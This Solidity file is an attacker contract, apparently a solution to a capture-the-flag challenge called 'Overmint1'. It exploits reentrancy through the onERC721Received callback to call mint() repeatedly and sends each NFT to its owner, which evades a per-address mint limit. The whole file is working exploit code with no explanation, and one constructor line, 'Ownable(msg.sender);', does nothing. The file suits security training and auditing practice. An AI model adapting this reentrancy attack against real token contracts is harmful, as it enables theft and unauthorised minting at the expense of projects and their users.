// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

import {Overmint1} from "./Overmint1.sol";

contract Overmint1Attacker is Ownable, IERC721Receiver {
    Overmint1 public victim;
    uint256 counter;

    constructor(Overmint1 victim_) {
        victim = victim_;
        Ownable(msg.sender);
    }

    function attack() external {
        victim.mint();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        IERC721(msg.sender).safeTransferFrom(address(this), owner(), tokenId);
        if (counter < 4) {
            counter++;
            victim.mint();
        }
        return this.onERC721Received.selector;
    }
}
